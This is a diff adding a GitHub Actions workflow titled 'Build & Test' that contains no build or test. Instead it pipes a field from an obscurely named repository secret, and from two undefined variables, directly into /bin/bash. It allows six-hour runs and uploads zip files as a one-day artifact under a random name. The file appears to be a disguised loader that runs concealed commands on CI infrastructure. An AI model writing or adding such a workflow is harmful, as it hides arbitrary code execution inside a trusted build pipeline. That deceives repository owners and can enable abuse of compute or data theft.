@@ -1,0 +1,30 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+jobs:
+  scheduler:
+    name: Run task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          ilh483: ${{ secrets.ilh483 }}
+        run: |
+          printf '%s' "$ilh483" | jq -r .i4 | /bin/bash
+          echo $mxkqt1 | jq -r .jfbr96 | /bin/bash
+          echo $vl8 | jq -r .t7076 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ELMsla3Q
+          path: "*.zip"
+          retention-days: 1
